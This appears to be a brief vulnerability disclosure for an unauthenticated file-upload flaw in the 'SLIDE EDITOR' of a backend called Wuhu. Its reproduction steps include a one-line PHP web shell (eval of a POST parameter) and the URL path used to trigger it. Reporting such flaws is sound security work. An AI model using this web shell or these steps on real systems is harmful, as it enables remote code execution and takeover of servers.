# description
In the "SLIDE EDITOR" feature, there is no strict filtering of the uploaded content, allowing an attacker to upload PHP files and thereby execute malicious code.
<img width="1058" alt="image" src="https://github.com/user-attachments/assets/73b6f2d6-6813-4e31-9716-01c4773ab45e">

# version
2024

# step
1. It appears that the Wuhu backend does not require authentication.
2. Click on the "SLIDE EDITOR" option in the menu bar and upload a shell.php file with the content <?php eval($_POST["cmd"]); ?>.
3. Access the malicious file via http://ip/slides/shell.php.

<img width="924" alt="image" src="https://github.com/user-attachments/assets/5b4065cf-a968-4057-b8af-f73abebc80f6">
